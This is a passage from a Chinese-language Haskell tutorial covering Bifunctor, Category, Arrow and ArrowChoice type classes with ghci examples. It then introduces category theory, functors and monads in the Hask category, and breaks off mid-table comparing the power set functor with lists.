first f . second g first f = bimap f id second g = bimap id g \u5bf9\u4e8e Functor\uff0c((,) e) \u548c Either e \u624d\u662f Functor \u7684\u5b9e\u4f8b\uff0c\u56e0\u4e3a\u4ed6\u4eec\u662f * -> *\u3002\u4f46\u662f\u5bf9\u4e8e Bifunctor\uff0c(,) \u548c Either \u5c31\u662f Bifunctor \u7684\u5b9e\u4f8b\uff1a ghci > bimap ( + 1 ) length ( 4 , [ 1 , 2 , 3 ]) ( 5 , 3 ) Bifunctor Laws \u00b6 bimap id id = id first id = id second id = id bimap (f . g) (h . i) = bimap f h . bimap g i first (f . g) = first f . first g second (f . g) = second f . second g Category \u00b6 Haskell \u4e2d\u7684 Category \u5c06\u4e00\u822c\u7684\u51fd\u6570\u63a8\u5e7f\u5230\u4e86\u666e\u904d\u7684\u6001\u5c04\u4e0a\uff0c\u5b83\u5728 Control.Category \u6a21\u5757\u4e2d\uff0c\u5b9a\u4e49\u662f\uff1a class Category cat where id :: cat a a ( . ) :: cat b c -> cat a b -> cat a c \u5b83\u7684\u5b9e\u4f8b\u6709 (->) \u548c Kleisli m \uff1a instance Category ( -> ) where id = GHC . Base . id ( . ) = ( GHC . Base .. ) Kleisli \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u7528\u6765\u8868\u793a\u51fd\u6570 a -> m b\uff0cHaskell \u4e2d\uff0c\u5b83\u5728 Control.Arrow \u6a21\u5757\u4e2d\u5b9a\u4e49\uff1a newtype Kleisli m a b = Kleisli { runKleisli :: a -> m b } instance Monad m => Category ( Kleisli m ) where id :: Kleisli m a a id = Kleisli return ( . ) :: Kleisli m b c -> Kleisli m a b -> Kleisli m a c Kleisli g . Kleisli h = Kleisli ( h >=> g ) Category \u8981\u6ee1\u8db3\u7684\u5b9a\u5f8b\u53ea\u6709 id \u662f (.) \u64cd\u4f5c\u7684\u5355\u4f4d\u5143\uff0c\u4ee5\u53ca (.) \u64cd\u4f5c\u662f\u53ef\u7ed3\u5408\u7684 \u540c\u65f6 Category \u8fd8\u63d0\u4f9b\u4e86\u4e24\u4e2a\u51fd\u6570 <<< \u548c >>> \uff1a ( <<< ) :: Category cat => cat b c -> cat a b -> cat a c ( <<< ) = ( . ) ( >>> ) :: Category cat => cat a b -> cat b c -> cat a c f >>> g = g . f Arrow \u00b6 Arrow \u5c06\u51fd\u6570\u8fdb\u4e00\u6b65\u62bd\u8c61\u5316\uff0c\u5b83\u5b9a\u4e49\u5728 Control.Arrow \u6a21\u5757\u4e2d\uff1a class Category a => Arrow a where arr :: ( b -> c ) -> a b c first :: a b c -> a ( b , d ) ( c , d ) second :: a b c -> a ( d , b ) ( d , c ) ( *** ) :: a b c -> a b' c' -> a ( b , b' ) ( c , c' ) ( &&& ) :: a b c -> a b c' -> a b ( c , c' ) {-# MINIMAL arr, (first | (***)) #-} \u5176\u4e2d\uff1a arr \u51fd\u6570\u5c06\u4e00\u4e2a\u51fd\u6570\u53d8\u6210\u4e00\u4e2a Arrow first \u51fd\u6570\u5c06\u4e00\u4e2a Arrow \u53d8\u6210\u4e00\u4e2a\u4e8c\u5143\u7ec4\u95f4\u7684 Arrow\uff0c\u4e14\u53ea\u4f1a\u5bf9\u4e00\u4e2a\u5143\u7d20\u8fdb\u884c\u64cd\u4f5c\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8 second \u51fd\u6570\u4e0e first \u76f8\u53cd\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u4fdd\u6301\u4e0d\u53d8 *** \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 parallel composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g *** h) (x, y) = (g x, h y) &&& \u51fd\u6570\u662f Arrow \u4e4b\u95f4\u7684 fanout composition\uff0c\u5bf9\u4e8e\u51fd\u6570: (g &&& h) x = (g x, h x) \u5b83\u7684\u5b9e\u4f8b\u4e5f\u6709 (->) \u548c Kleisli\uff1a instance Arrow ( -> ) where arr :: ( b -> c ) -> ( b -> c ) arr g = g first :: ( b -> c ) -> (( b , d ) -> ( c , d )) first g ( x , y ) = ( g x , y ) instance Monad m => Arrow ( Kleisli m ) where arr :: ( b -> c ) -> Kleisli m b c arr f = Kleisli ( return . f ) first :: Kleisli m b c -> Kleisli m ( b , d ) ( c , d ) first ( Kleisli f ) = Kleisli ( \\ ~ ( b , d ) -> do c <- f b return ( c , d ) ) \u5e38\u7528\u51fd\u6570\uff1a returnA :: Arrow a => a b b returnA = arr id ( ^>> ) :: Arrow a => ( b -> c ) -> a c d -> a b d f ^>> a = arr f >>> a ( >>^ ) :: Arrow a => a b c -> ( c -> d ) -> a b d a >>^ f = a >>> arr f ( <<^ ) :: Arrow a => a c d -> ( b -> c ) -> a b d a <<^ f = a <<< arr f ( ^<< ) :: Arrow a => ( c -> d ) -> a b c -> a b d f ^<< a = arr f <<< a Arrow notation \u00b6 \u7c7b\u4f3c do-notation\uff0cArrow \u4e5f\u63d0\u4f9b\u4e86\u4e00\u5957\u65b9\u4fbf\u7684\u8bed\u53e5\uff1a proc x -> do y <- action1 -< ... z <- action2 -< ... returnA -< ... \u5176\u4e2d proc \u4ee3\u66ff\u4e86 lambda \u8868\u8fbe\u5f0f\u4e2d\u7684\u659c\u6760 \\\uff0c-< \u53f3\u8fb9\u7684\u4e3a\u8f93\u5165\uff0c\u5de6\u8fb9\u7684\u4e3a\u63a5\u6536\u8f93\u5165\u7684\u51fd\u6570\u3002\u6bd4\u5982\uff0c\u4e0b\u9762\u4e09\u79cd\u5199\u6cd5\u8fbe\u6210\u7684\u6548\u679c\u662f\u4e00\u6837\u7684\uff1a f :: Int -> ( Int , Int ) f = \\ x -> let y = 2 * x z1 = y + 3 z2 = y - 5 in ( z1 , z2 ) -- ghci> f 10 -- (23,15) fM :: Int -> Identity ( Int , Int ) fM = \\ x -> do y <- return ( 2 * x ) z1 <- return ( y + 3 ) z2 <- return ( y - 5 ) return ( z1 , z2 ) -- ghci> runIdentity (fM 10) -- (23,15) fA :: Int -> ( Int , Int ) fA = proc x -> do y <- ( 2 * ) -< x z1 <- ( + 3 ) -< y z2 <- ( subtract 5 ) -< y returnA -< ( z1 , z2 ) -- ghci> fA 10 -- (23,15) ArrowChoice \u00b6 class Arrow a => ArrowChoice a where left :: a b c -> a ( Either b d ) ( Either c d ) left = ( +++ id ) right :: a b c -> a ( Either d b ) ( Either d c ) right = ( id +++ ) ( +++ ) :: a b c -> a b' c' -> a ( Either b b' ) ( Either c c' ) f +++ g = left f >>> arr mirror >>> left g >>> arr mirror where mirror :: Either x y -> Either y x mirror ( Left x ) = Right x mirror ( Right y ) = Left y ( ||| ) :: a b d -> a c d -> a ( Either b c ) d f ||| g = f +++ g >>> arr untag where untag ( Left x ) = x untag ( Right y ) = y instance ArrowChoice ( -> ) where left f = f +++ id right f = id +++ f f +++ g = ( Left . f ) ||| ( Right . g ) ( ||| ) = either instance Monad m => ArrowChoice ( Kleisli m ) where left f = f +++ arr id right f = arr id +++ f f +++ g = ( f >>> arr Left ) ||| ( g >>> arr Right ) Kleisli f ||| Kleisli g = Kleisli ( either f g ) ArrowZero & ArrowPlus \u00b6 class Arrow a => ArrowZero a where zeroArrow :: a b c class ArrowZero a => ArrowPlus a where ( <+> ) :: a b c -> a b c -> a b c instance MonadPlus m => ArrowZero ( Kleisli m ) where zeroArrow = Kleisli ( \\ _ -> mzero ) instance MonadPlus m => ArrowPlus ( Kleisli m ) where Kleisli f <+> Kleisli g = Kleisli ( \\ x -> f x ` mplus ` g x ) \u4f8b\u5b50 \u00b6 ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) <+> ( Kleisli ( \\ x -> [ x , - x ]))) 2 [ 4 , 2 , - 2 ] ghci > either ( + 2 ) ( * 3 ) ( Left 3 ) 5 ghci > either ( + 2 ) ( * 3 ) ( Right 3 ) 9 ghci > ( + 2 ) ||| ( * 3 ) $ ( Left 3 ) 5 ghci > ( + 2 ) +++ ( * 3 ) $ ( Left 3 ) Left 5 ghci > ( + 2 ) ||| ( * 3 ) $ ( Right 3 ) 9 ghci > ( + 2 ) +++ ( * 3 ) $ ( Right 3 ) Right 9 ghci > left ( + 2 ) ( Left 3 ) Left 5 ghci > right ( * 3 ) ( Right 3 ) Right 9 ghci > left ( + 2 ) ( Right 3 ) Right 3 ghci > right ( * 3 ) ( Left 3 ) Left 3 ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) ||| ( Kleisli ( \\ x -> [ x , - x ]))) ( Left 3 ) [ 6 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) ||| ( Kleisli ( \\ x -> [ x , - x ]))) ( Right 3 ) [ 3 , - 3 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) +++ ( Kleisli ( \\ x -> [ x , - x ]))) ( Left 3 ) [ Left 6 ] ghci > runKleisli (( Kleisli ( \\ x -> [ x * 2 ])) +++ ( Kleisli ( \\ x -> [ x , - x ]))) ( Right 3 ) [ Right 3 , Right ( - 3 )] Haskell \u4e0e\u8303\u7574\u8bba \u00b6 Haskell \u4e2d\u7684\u51fd\u5b50\u5355\u5b50\u7b49\u90fd\u4e0e\u8303\u7574\u8bba\uff08category theory\uff09\u6709\u5f88\u591a\u8054\u7cfb\uff0c\u6240\u4ee5\u6253\u7b97\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\u8303\u7574\u8bba\u7684\u76f8\u5173\u5185\u5bb9\u3002 \u8303\u7574\u8bba \u662f\u6570\u5b66\u7684\u4e00\u95e8\u5b66\u79d1\uff0c\u4ee5\u62bd\u8c61\u7684\u65b9\u6cd5\u5904\u7406\u6570\u5b66\u6982\u5ff5\uff0c\u5c06\u8fd9\u4e9b\u6982\u5ff5\u5f62\u5f0f\u5316\u6210\u4e00\u7ec4\u7ec4\u7684\u201c\u7269\u4ef6\u201d\u53ca\u201c\u6001\u5c04\u201d\u3002\u6570\u5b66\u4e2d\u8bb8\u591a\u91cd\u8981\u7684\u9886\u57df\u53ef\u4ee5\u5f62\u5f0f\u5316\u4e3a\u8303\u7574\u3002\u4f7f\u7528\u8303\u7574\u8bba\u53ef\u4ee5\u4ee4\u8fd9\u4e9b\u9886\u57df\u4e2d\u8bb8\u591a\u96be\u7406\u89e3\u3001\u96be\u6349\u6478\u7684\u6570\u5b66\u7ed3\u8bba\u66f4\u5bb9\u6613\u53d9\u8ff0\u8bc1\u660e\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 \u8303\u7574\uff08Category\uff09 \u00b6 \u8303\u7574\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u96c6\u5408\uff0c\u4e00\u4e2a\u8303\u7574 \\(\\mathbf{C}\\) \u5305\u542b\u4e09\u4e2a\u7ec4\u6210\u6210\u5206\uff1a \u4e00\u4e2a\u7c7b \\(\\mathrm{ob}(\\mathbf{C})\\) \uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a \u5bf9\u8c61\uff08objects\uff09 \u4e00\u4e2a\u7c7b \\(\\mathrm{hom}(\\mathbf{C})\\) \uff1a\u5176\u4e2d\u5143\u7d20\u79f0\u4e3a \u6001\u5c04\uff08morphisms\uff09 \uff08\u6216 \u7bad\u53f7\uff08arrows\uff09 \uff09\uff1a\u6bcf\u4e2a\u6001\u5c04\u8fde\u63a5\u4e86\u4e24\u4e2a\u5bf9\u8c61\uff1a\u6e90\u5bf9\u8c61\uff08source object\uff09\u3001\u76ee\u6807\u5bf9\u8c61\uff08target object\uff09\u3002\u5982\u679c \\(f\\) \u662f\u4ece\u6e90\u5bf9\u8c61 \\(A\\) \u5230\u76ee\u6807\u5bf9\u8c61 \\(B\\) \uff08 \\(A, B\\in \\mathrm{ob}(\\mathbf{C})\\) \uff09\u7684\u6001\u5c04\uff0c\u90a3\u4e48\u8bb0\u4e3a \\(f : A\\to B\\) \u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\uff0c\u79f0\u4e3a\u6001\u5c04 \u590d\u5408\uff08composition\uff09 \uff1a\u4e24\u4e2a\u6001\u5c04 \\(g : A\\to B\\) \u3001 \\(f : B\\to C\\) \u7684\u590d\u5408\u8bb0\u4e3a \\(f\\circ g : A\\to C\\) \u5728 Haskell \u548c\u5927\u90e8\u5206\u6570\u5b66\u7406\u8bba\u4e2d\u90fd\u662f\u4ece\u53f3\u5411\u5de6\u8ba1\u7b97\uff0c\u5373 \\(f\\circ g\\) \u4e2d\u662f\u5148\u8ba1\u7b97 \\(g : A\\to B\\) \u518d\u8ba1\u7b97 \\(f : B\\to C\\) \u8bb8\u591a\u4e1c\u897f\u90fd\u53ef\u4ee5\u7ec4\u6210\u8303\u7574\u3002\u6bd4\u5982: \u4f8b \u2003 \\(\\mathbf{Set}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u96c6\u5408\uff0c\u6001\u5c04\u4e3a\u96c6\u5408\u4e4b\u95f4\u7684\u51fd\u6570\uff0c\u590d\u5408\u5373\u51fd\u6570\u4e4b\u95f4\u7684\u590d\u5408 \u2003 \\(\\mathbf{Grp}\\) \u662f\u4e00\u4e2a\u8303\u7574\uff0c\u5bf9\u8c61\u4e3a\u6240\u6709\u7fa4\uff0c\u6001\u5c04\u4e3a\u7fa4\u540c\u6001\uff08group homomorphisms\uff09\uff0c\u4f8b\u5982\u5bf9\u4e8e\u7fa4 \\((G,*)\\) \u548c \\((H,\\cdot )\\) \uff0c\u6709\u7fa4\u540c\u6001 \\(h : (G,*)\\to (H,\\cdot )\\) \uff0c\u5219\u9700\u8981\u5bf9\u4e8e \\(G\\) \u4e2d\u7684\u4efb\u610f\u5143\u7d20 \\(u,v\\) \u6ee1\u8db3 \\[h(u*v)=h(u)\\cdot h(v)\\] \u6ce8\u610f \u6001\u5c04\u4e0d\u5fc5\u987b\u4e3a\u51fd\u6570\uff1b\u800c\u4e14\u53ef\u4ee5\u5b58\u5728\u6e90\u5bf9\u8c61\u548c\u76ee\u6807\u5bf9\u8c61\u90fd\u76f8\u540c\u7684\u4e0d\u540c\u6001\u5c04 \u8303\u7574\u516c\u7406 \u00b6 \u6bcf\u4e2a\u8303\u7574\u90fd\u9700\u8981\u6ee1\u8db3\u4e09\u6761\u5b9a\u5f8b\uff1a \u6001\u5c04\u590d\u5408\u9700\u8981\u6ee1\u8db3 \u7ed3\u5408\u5f8b\uff08associativity\uff09 \uff1a \\(f\\circ (g\\circ h) = (f\\circ g)\\circ h\\) \u8303\u7574\u5728\u590d\u5408\u64cd\u4f5c\u4e0b\u662f \u95ed\u5408\u7684\uff08closed\uff09 \uff1a \u2003\u2003\u2003\u5982\u679c\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u5b58\u5728\u6001\u5c04 \\(f : B\\to C\\) \u3001 \\(g : A\\to B\\) \uff0c\u90a3\u4e48\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u4e5f\u4e00\u5b9a\u5b58\u5728\u6001\u5c04 \\(h : A\\to C\\) \uff0c\u4e14 \\(h=f\\circ g\\) \u6bcf\u4e2a\u5bf9\u8c61\u90fd\u9700\u8981\u6709 \u5355\u4f4d\u6001\u5c04\uff08identity morphisms\uff09 \uff1a \u2003\u2003\u2003\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u7684\u5bf9\u8c61 \\(A\\) \uff0c\u4e00\u5b9a\u5b58\u5728\u5355\u4f4d\u6001\u5c04 \\(\\mathrm{id}_A : A\\to A\\) \uff0c\u4e14\u5bf9\u4e8e\u6bcf\u4e2a\u6001\u5c04 \\(g : A\\to B\\) \uff0c\u4e00\u5b9a\u6709\uff1a \\(g\\circ\\mathrm{id}_A = \\mathrm{id}_B\\circ g = g\\) \\(\\mathbf{Hask}\\) \u8303\u7574 \u00b6 \u8303\u7574 \\(\\mathbf{Hask}\\) \u7684\u5bf9\u8c61\u4e3a Haskell \u4e2d\u7684\u7c7b\u578b\uff08types\uff09\uff0c\u6001\u5c04\u662f Haskell \u4e2d\u7684\u51fd\u6570\uff0c\u590d\u5408\u8fd0\u7b97\u662f (.) \u3002\u5373\u4ece\u7c7b\u578b A \u5230\u7c7b\u578b B \u7684\u51fd\u6570 f :: A -> B \u5c31\u662f \\(\\mathbf{Hask}\\) \u8303\u7574\u4e2d\u7684\u4e00\u4e2a\u6001\u5c04\u3002\u800c\u51fd\u6570 f :: B -> C \u3001g :: A -> B \u7684\u7ec4\u5408 f . g \u5c31\u662f\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 h :: A -> C\u3002 \u5bf9\u4e8e\u4e09\u6761\u5b9a\u5f8b\uff1a \u7b2c\u4e00\u6761\u663e\u7136\u6ee1\u8db3\uff1af . (g . h) = (f . g) . h \u7b2c\u4e8c\u6761\u4e5f\u663e\u7136\u6ee1\u8db3\uff0c\u5982\u679c\u6709\u51fd\u6570 f :: B -> C \u3001g :: A -> B\uff0c\u4e00\u5b9a\u6709\u51fd\u6570 h = (f . g) :: A -> C \u5bf9\u4e8e\u7b2c\u4e09\u6761\u5b9a\u5f8b\uff0cHaskell \u4e2d\u5b58\u5728\u5355\u4f4d\u51fd\u6570 id \uff0c\u4f46 id \u662f\u591a\u6001\uff08polymorphic\uff09\u7684\uff0c\u8981\u4e3a\u5176\u6307\u5b9a\u7c7b\u578b\u4f7f\u5176\u53d8\u6210\u5355\u6001\uff08monomorphic\uff09\u7684\u3002\u6bd4\u5982\u6001\u5c04 \\(\\mathrm{id}_A\\) \u5728 Haskell \u4e2d\u5c31\u53ef\u4ee5\u8868\u793a\u4e3a id :: A -> A\u3002\u5e76\u4e14\u663e\u7136\u6ee1\u8db3\u7b2c\u4e09\u6761\u5b9a\u5f8b\uff08\u5176\u4e2d f :: A -> B\uff09\uff1a (id :: B -> B) . f = f . (id :: A -> A) = f \u51fd\u5b50\uff08Functors\uff09 \u00b6 \u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u5c06\u4e24\u4e2a\u5bf9\u8c61\u8054\u7cfb\u8d77\u6765\uff0c\u800c\u51fd\u5b50\u5219\u4f1a\u5c06\u4e24\u4e2a\u8303\u7574\u8054\u7cfb\u8d77\u6765\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u51fd\u5b50\u5c31\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u3001 \\(\\mathbf{D}\\) \uff0c\u5b9a\u4e49\u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u6ee1\u8db3\uff1a \u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u5bf9\u8c61 \\(A\\) \uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u5bf9\u8c61 \\(F(A)\\) \u5bf9\u4e8e \\(\\mathbf{C}\\) \u4e2d\u7684\u4efb\u610f\u6001\u5c04 \\(f : A\\to B\\) \uff0c\u5728 \\(\\mathbf{D}\\) \u4e2d\u90fd\u6709\u6001\u5c04 \\(F(f) : F(A)\\to F(B)\\) \u4f8b \u9057\u5fd8\u51fd\u5b50\uff08forgetful functor\uff09 \\(U : \\mathbf{Grp}\\to\\mathbf{Set}\\) \uff0c\u5c06\u4e00\u4e2a\u7fa4\u6620\u5c04\u5230\u4e00\u4e2a\u96c6\u5408\u4e2d\uff0c\u5c06\u7fa4\u540c\u6001\u6620\u5c04\u5230\u96c6\u5408\u95f4\u7684\u51fd\u6570 \u5e42\u96c6\u51fd\u5b50\uff08power set functor\uff09 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) \uff0c\u5c06\u4e00\u4e2a\u96c6\u5408\u6620\u5c04\u5230\u5b83\u7684\u5e42\u96c6\uff0c\u5c06\u539f\u96c6\u5408\u4e2d\u7684\u51fd\u6570 \\(f : A\\to B\\) \u6620\u5c04\u5230\u51fd\u6570 \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) \uff0c\u5373\u4ece \\(U\\subseteq A\\) \u5230\u503c\u57df \\(f(U)\\subseteq B\\) \u7684\u6620\u5c04 \u81ea\u51fd\u5b50\uff08endofunctor\uff09 \\(1_{\\mathbf{C}} : \\mathbf{C}\\to\\mathbf{C}\\) \uff0c\u5c06\u4e00\u4e2a\u8303\u7574\u6620\u5c04\u5230\u5b83\u672c\u8eab \u51fd\u5b50\u516c\u7406 \u00b6 \u51fd\u5b50 \\(F : \\mathbf{C}\\to\\mathbf{D}\\) \u4e5f\u9700\u8981\u6ee1\u8db3\u4e24\u4e2a\u516c\u7406\uff1a \u5bf9\u4e8e\u4efb\u610f\u5bf9\u8c61 \\(X\\in\\mathbf{C}\\) \uff0c\u6052\u6709 \\(F(\\mathrm{id}_X)=\\mathrm{id}_{F(X)}\\) \u5bf9\u4e8e\u6001\u5c04 \\(f : Y\\to Z\\) \u3001 \\(g : X\\to Y\\) \uff0c\u6052\u6709 \\(F(f\\circ g) = F(f)\\circ F(g)\\) \\(\\mathbf{Hask}\\) \u8303\u7574\u4e0a\u7684\u51fd\u5b50 \u00b6 Haskell \u4e2d\u7684 Functor \u5b9a\u4e49\u662f\uff1a class Functor ( f :: * -> * ) where fmap :: ( a -> b ) -> f a -> f b \u5bf9\u4e8e Haskell \u4e2d\u7684 Functor\uff0c\u5b83\u5b9e\u9645\u4e0a\u662f\u4ece \\(\\mathbf{Hask}\\) \u8303\u7574\uff08types\uff09\u5230\u5b83\u5b50\u8303\u7574\u7684\u53d8\u6362\u3002\u6bd4\u5982\u5217\u8868\u51fd\u5b50 \\(\\texttt{[]} : \\mathbf{Hask}\\to\\mathbf{Lst}\\) \uff08\u5176\u4e2d \\(\\mathbf{Lst}\\) \u662f\u6240\u6709 Haskell \u4e2d\u5217\u8868\u7c7b\u578b\u6784\u6210\u7684\u8303\u7574\uff09 \u5b83\u4e5f\u8fbe\u6210\u4e86\u8303\u7574\u8bba\u4e2d\u5bf9\u4e8e\u51fd\u5b50\u7684\u8981\u6c42\u3002\u51fd\u5b50\u9700\u8981\u8fdb\u884c\u4e24\u4e2a\u64cd\u4f5c\uff1a\u5c06\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u5bf9\u8c61\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u4e2d\u3001\u5c06\u4e00\u4e2a\u8303\u7574\u4e2d\u7684\u6001\u5c04\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u8303\u7574\u4e2d\u3002\u4ee5 Maybe \u4e3a\u4f8b\uff0c\u5b83\u5b9e\u73b0\u4e86\u51fd\u5b50\u7684\u8981\u6c42\uff1a Maybe \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u4ed6\u53ef\u4ee5\u5c06\u4efb\u610f\u7c7b\u578b T \u53d8\u6210\u65b0\u7c7b\u578b Maybe T\uff0c\u76f8\u5f53\u4e8e\u4ece \\(\\mathbf{Hask}\\) \u8303\u7574\u7684\u5bf9\u8c61\u53d8\u6210\u4e86 \\(\\mathbf{Maybe}\\) \u8303\u7574\u7684\u5bf9\u8c61 fmap \u51fd\u6570\u63a5\u6536\u4e00\u4e2a a -> b \u7c7b\u578b\u7684\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a Maybe a -> Maybe b \u7c7b\u578b\u7684\u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u5c06 \\(\\mathbf{Hask}\\) \u8303\u7574\u4e2d\u7684\u6001\u5c04 \\(f : A\\to B\\) \u6620\u5c04\u6210\u4e86 \\(\\mathbf{Maybe}\\) \u8303\u7574\u4e2d\u7684\u6001\u5c04 \\(\\mathbf{Maybe}(f) : \\mathbf{Maybe}(A)\\to\\mathbf{Maybe}(B)\\) \u6ce8\u610f \u65f6\u523b\u8bb0\u4f4f\u8fd9\u91cc\u7814\u7a76\u7684\u662f \\(\\mathbf{Hask}\\) \u8303\u7574\u548c\u5b83\u7684\u5b50\u8303\u7574\uff0c\u5bf9\u8c61\u662f\u7c7b\u578b\u800c\u4e0d\u662f\u503c\uff0c\u6001\u5c04\u662f\u51fd\u6570\u4e5f\u6307\u7684\u662f\u4ece\u7c7b\u578b\u5230\u7c7b\u578b \u540c\u65f6\uff0cHaskell \u4e2d\u7684 Functor \u4e5f\u6ee1\u8db3\u51fd\u5b50\u516c\u7406\uff1a fmap id = id \u5373 fmap (id :: A -> A) = (id :: f A -> f A) fmap (f . g) = fmap f . fmap g \u5355\u5b50\uff08Monads\uff09 \u00b6 \u4e00\u4e2a\u5355\u5b50\u8bf4\u767d\u4e86\u4e0d\u8fc7\u5c31\u662f\u81ea\u51fd\u5b50\u8303\u7574\u4e0a\u7684\u4e00\u4e2a\u5e7a\u534a\u7fa4\u800c\u5df2 _(:\u0437\u300d\u2220)_ \u81ea\u51fd\u5b50\u5728\u524d\u9762\u8bf4\u5230\u8fc7\u662f\u4ece\u4e00\u4e2a\u8303\u7574\u5230\u81ea\u8eab\u7684\u4e00\u4e2a\u51fd\u5b50\uff0c\u5982\u8303\u7574 \\(\\mathbf{C}\\) \u4e0a\u7684\u81ea\u51fd\u5b50\u662f \\(F : \\mathbf{C}\\to\\mathbf{C}\\) \u3002\u81ea\u51fd\u5b50\u8303\u7574\u5c31\u662f\u5bf9\u8c61\u90fd\u662f\u81ea\u51fd\u5b50\u7684\u8303\u7574\u3002\u5e7a\u534a\u7fa4\u548c Haskell \u4e2d\u5b66\u5230\u7684 Monoid \u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u662f\u4e00\u4e2a\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\u548c\u5355\u4f4d\u5143\u7684\u4ee3\u6570\u7ed3\u6784\u3002\u56e0\u6b64\u5355\u5b50\u5c31\u662f\u4e00\u4e2a\u81ea\u51fd\u5b50\uff0c\u800c\u4e14\u5b83\u6709\u53ef\u7ed3\u5408\u4e8c\u5143\u8fd0\u7b97\uff08Haskell \u4e2d >=> \uff09\u548c\u5355\u4f4d\u5143\uff08Haskell \u4e2d return \uff09\u3002 \u4e00\u4e2a\u5355\u5b50 \\(M : \\mathbf{C}\\to\\mathbf{C}\\) \u8fd8\u5305\u542b\u4e24\u4e2a\u6001\u5c04\uff08\u5bf9\u4e8e\u8303\u7574 \\(\\mathbf{C}\\) \u4e2d\u7684\u6240\u6709\u5bf9\u8c61 \\(X\\) \uff09\uff1a \\(\\mathrm{unit}_X^M : X\\to M(X)\\) \\(\\mathrm{join}_X^M : M(M(X))\\to M(X)\\) \uff08\u5f53\u5f0f\u5b50\u4e2d\u7684\u5355\u5b50\u660e\u663e\u662f \\(M\\) \u65f6\uff0c\u53ef\u4ee5\u7701\u7565\u4e0a\u6807 \\({}^M\\) \uff09 Haskell \u4e2d Monad \u7684\u5b9a\u4e49\u662f\uff1a class Functor m => Monad m where return :: a -> m a ( >>= ) :: m a -> ( a -> m b ) -> m b \u5176\u4e2d\u5f88\u663e\u7136\u591a\u6001\u51fd\u6570 return \u5bf9\u5e94\u4e86\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{unit}\\) \uff0c\u4f46\u662f >>= \u548c \\(\\mathrm{join}\\) \u7684\u5bf9\u5e94\u5173\u7cfb\u5e76\u4e0d\u660e\u663e\u3002\u56e0\u6b64 Haskell \u4e2d\u6709\u4e00\u4e2a\u5de5\u5177\u51fd\u6570 join \uff0c\u5b83\u7684\u6548\u679c\u5c31\u662f\u5b9a\u4e49\u4e2d\u7684 \\(\\mathrm{join}\\) \uff0c\u800c\u4e14\u5b83\u53ef\u4ee5\u548c >>= \u4e92\u76f8\u5b9a\u4e49\uff1a join :: Monad m => m ( m a ) -> m a join x = x >>= id ( >>= ) :: m a -> ( a -> m b ) -> m b x >>= f = join $ fmap f x \u6240\u4ee5 Haskell \u4e2d\u4e3a Monad \u8981\u6c42\u5b9a\u4e49 >>= \u5c31\u76f8\u5f53\u4e8e\u5b9a\u4e49\u4e86 \\(\\mathrm{join}\\) \u4f8b\u5982\uff0c\u5e42\u96c6\u51fd\u5b50 \\(P : \\mathbf{Set}\\to\\mathbf{Set}\\) \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u53ef\u4ee5\u4e3a\u5b83\u5b9a\u4e49 \\(\\mathrm{unit}\\) \u548c \\(\\mathrm{join}\\) \u4e24\u4e2a\u6001\u5c04\u3002Haskell \u4e2d\u7684\u5217\u8868\u4e5f\u53ef\u4ee5\u8fd1\u4f3c\u770b\u4f5c\u5e42\u96c6\u51fd\u5b50\u3002 \u6001\u5c04/\u51fd\u6570\u7684\u7c7b\u578b \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \u4e00\u4e2a\u96c6\u5408 \\(S\\) \u548c\u4e00\u4e2a\u6001\u5c04 \\(f : A\\to B\\) \u4e00\u4e2a\u7c7b\u578b T \u548c\u4e00\u4e2a\u51fd\u6570 f :: A -> B \\(P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)\\) fmap f :: [A] -> [B] \\(\\mathrm{unit}_S : S\\to\\mathcal{P}(S)\\) return :: T -> [T] \\(\\mathrm{join}_S : \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)\\) join :: [[T]] -> [T] \u6001\u5c04/\u51fd\u6570\u7684\u5b9a\u4e49 \u5e42\u96c6\u51fd\u5b50 Haskell \u4e2d\u5217\u8868 \\((\\mathcal{P}(f))(S) = \\\\{f(a):a\\in S\\\\}\\) fmap f xs = 